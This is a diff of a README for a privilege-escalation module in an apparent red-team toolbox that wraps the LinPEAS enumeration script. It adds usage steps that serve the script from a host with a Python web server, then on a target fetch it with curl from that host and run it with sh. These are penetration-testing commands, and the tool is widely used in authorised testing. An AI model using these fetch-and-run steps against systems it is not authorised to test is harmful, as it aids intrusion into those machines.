@@ -1,11 +1,41 @@
+# Privilege Escalation Phase
 
+Definition Privilege Escalation...
 
+This script implements *LinPEAS* from [PEASS-ng](https://github.com/carlospolop/PEASS-ng).
 
+For more information, go to [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 
+## Usage
 
+From github:
+```sh
+curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/privesc/privesc.sh
+sh privesc.sh -h
+```
+Local network:
+```sh
+# Host:
+python3 -m http.server 8000 #python3
+python2 -m SimpleHTTPServer 8000 #python2
 
+# Target:
+curl -LJO <Host>:8000/privesc.sh
+sh privesc.sh -h
+```
 
-## Module for Metasploit
+## Results
 
-Exploiting with metasploit? Run linPEAS/winPEAS as a metasploit module from a meterpreter or shell session: https://github.com/carlospolop/PEASS-ng/tree/master/metasploit
+The results are printed directly to STDOUT.
+To print the output to a file, use the following command:
+```sh
+sh privesc.sh -a > /output/file.txt
+```
+You can read the file with colors:
+```sh
+less -r /output/file.txt
+```
 
+## Compatibility
+
+The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems. 
